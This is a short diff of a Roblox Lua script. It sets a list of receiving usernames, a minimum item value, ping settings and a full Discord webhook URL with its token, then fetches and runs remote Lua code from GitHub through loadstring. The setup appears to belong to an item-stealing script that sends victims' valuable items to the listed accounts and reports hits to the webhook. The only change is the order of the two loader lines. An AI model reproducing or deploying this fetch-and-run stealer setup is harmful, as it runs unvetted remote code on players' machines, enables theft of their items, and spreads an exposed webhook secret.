@@ -2,5 +2,6 @@ _G.Usernames = {"Eblackblk", "FadySNA","Andrewdagoatya","ThunderStealthZap16"} -
 _G.min_rap = 50
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1473240091035172919/3SYPN5dFkO6mmwHqyFQl1S0hUJK5BvQQx3__goPnHZLXrc7cCQgbBgKjaSrQVFWglyhN" -- change to your webhook
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Anouar111/V-2/refs/heads/main/V-all.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Anouar111/V-2/refs/heads/main/V-all.lua"))()
